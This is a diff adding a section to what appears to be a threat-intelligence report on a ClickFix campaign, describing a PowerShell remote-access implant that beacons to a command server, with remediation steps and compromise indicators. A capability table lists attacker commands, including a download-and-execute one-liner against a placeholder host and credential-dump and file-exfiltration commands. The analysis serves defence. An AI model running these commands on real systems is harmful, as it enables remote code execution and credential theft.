@@ -1404,6 +1404,62 @@
 }</code></pre>
     </div>
 
+    <h3>e1.ps1 — Remote Access Capability</h3>
+
+    <p>The JavaScript drainer kit gets the headlines, but <code>e1.ps1</code> is the more serious capability. A drained wallet is a one-time loss. A compromised machine is an open door indefinitely — and that is exactly what this implant achieves.</p>
+
+    <p>Once installed, <code>e1.ps1</code> gives the threat actor <strong>full, persistent, interactive remote access to the victim's machine</strong>. Every 15 minutes the implant phones home to <code>allyhaychinsun.com/executor</code>, checks for a queued command, executes it in memory via <code>Invoke-Expression</code>, and returns the output. No files are written to disk during execution. No child process spawns that looks obviously malicious. From an endpoint detection perspective, it is PowerShell — a tool that exists on every Windows machine — making a web request, which is entirely normal behavior.</p>
+
+    <div class="finding red">
+      <div class="finding-label">⚠ Critical — Victim Machines Are Actively Waiting for Payloads</div>
+      <p>Every machine that executed the ClickFix payload is sitting idle right now, beaconing to <code>allyhaychinsun.com/executor</code> on a 15-minute cycle, waiting for the threat actor to issue a command. The actor does not need to do anything proactively — the implant will check in automatically, indefinitely, until it is found and removed. Given the 161,153+ victim pool targeted by this campaign, the number of compromised machines actively beaconing is potentially significant.</p>
+    </div>
+
+    <p>Through the C2 channel the threat actor can execute any PowerShell command on any compromised host. Practical capabilities include:</p>
+
+    <table class="data-table">
+      <thead><tr><th>Capability</th><th>Example Command</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>Credential harvest</td>
+          <td class="mono">Get-StoredCredential; browser password dumps</td>
+          <td>Email, banking, exchange account access</td>
+        </tr>
+        <tr>
+          <td>File exfiltration</td>
+          <td class="mono">Get-ChildItem; Invoke-WebRequest -OutFile</td>
+          <td>Documents, wallets, private keys, seed phrase files</td>
+        </tr>
+        <tr>
+          <td>Additional payload delivery</td>
+          <td class="mono">iex(iwr('https://[domain]/payload.ps1'))</td>
+          <td>Ransomware, keylogger, additional implants</td>
+        </tr>
+        <tr>
+          <td>Lateral movement</td>
+          <td class="mono">Enter-PSSession; Invoke-Command</td>
+          <td>Pivot to other machines on the same network</td>
+        </tr>
+        <tr>
+          <td>Persistence expansion</td>
+          <td class="mono">New-Service; additional scheduled tasks</td>
+          <td>Deeper entrenchment, harder removal</td>
+        </tr>
+        <tr>
+          <td>System reconnaissance</td>
+          <td class="mono">Get-Process; Get-NetIPAddress; whoami /all</td>
+          <td>Victim profiling for targeted follow-on attacks</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <p>Persistent remote access is the primary objective of most advanced malware — and this implant achieves it cleanly. The dual persistence mechanisms (scheduled task + registry run key) ensure that even a partial remediation effort — finding and deleting one persistence mechanism — leaves the other intact. The only reliable remediation is a full wipe and reinstall of the affected machine.</p>
+
+    <div class="finding yellow">
+      <div class="finding-label">Remediation Guidance</div>
+      <p>If the ClickFix payload was executed: (1) Assume the machine is fully compromised. (2) Do not attempt to use the machine for any sensitive activity — banking, email, exchange logins. (3) Check for scheduled tasks matching <code>MicrosoftEdgeUpdateTaskMachineCore</code> and registry run keys matching <code>MicrosoftEdgeHelper</code> — their presence confirms compromise. (4) Perform a full wipe and OS reinstall. (5) Rotate all credentials that were used on the machine. (6) Revoke all wallet token approvals at <strong>revoke.cash</strong>.</p>
+    </div>
+
     <h3>JavaScript Drainer Kit — Key Functions</h3>
     <p>The JS drainer kit spans approximately 117,000 lines and was recovered directly from the lure site source (<code>yefam.finance</code> / <code>blosk.io</code>). It executes entirely within the victim's browser — it is <strong>not</strong> delivered to the victim's machine as a file. The drainer activates when the victim connects their wallet to the fake DeFi claim portal, and targets all major wallet providers including Ledger, Trezor, MetaMask, Coinbase Wallet, Trust Wallet, Rabby, and any WalletConnect-compatible wallet. The most analytically significant components are documented below.</p>
 
